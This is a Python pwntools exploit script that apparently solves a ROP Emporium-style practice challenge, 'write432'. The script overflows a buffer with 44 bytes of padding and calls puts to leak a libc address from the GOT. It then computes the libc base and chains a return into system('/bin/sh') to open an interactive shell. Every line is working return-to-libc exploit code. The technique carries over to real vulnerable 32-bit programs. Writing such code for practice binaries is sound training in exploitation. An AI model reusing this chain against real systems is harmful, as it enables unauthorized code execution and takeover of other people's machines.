from pwn import *
import base64

local_bin = "./write432"
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

p = process(local_bin)
elf = ELF(local_bin)
rop = ROP(elf)

OFFSET = "A"*44
PUTS_PLT = elf.plt['puts']
MAIN_PLT = elf.symbols['main']
log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))

puts_GOT = elf.got["puts"]
log.info("puts" + " GOT @ " + hex(puts_GOT))

rop1 = OFFSET + p32(PUTS_PLT) + p32(MAIN_PLT) + p32(puts_GOT)
# clean socket buffer (read all and print)
print(p.clean()) 
# Leak address
p.sendline(rop1)

leak = u32(p.recvline()[:4])
libc.address = leak - libc.symbols["puts"]
log.info("leaked puts @ %s" % hex(leak))
log.info("libc base @ %s" % hex(libc.address))

BINSH = next(libc.search("/bin/sh"))
SYSTEM = libc.sym["system"]
EXIT = "\x12"*4 # this can be anything
log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))

rop2 = OFFSET + p32(SYSTEM) + EXIT + p32(BINSH)
p.clean()
p.sendline(rop2)
p.interactive()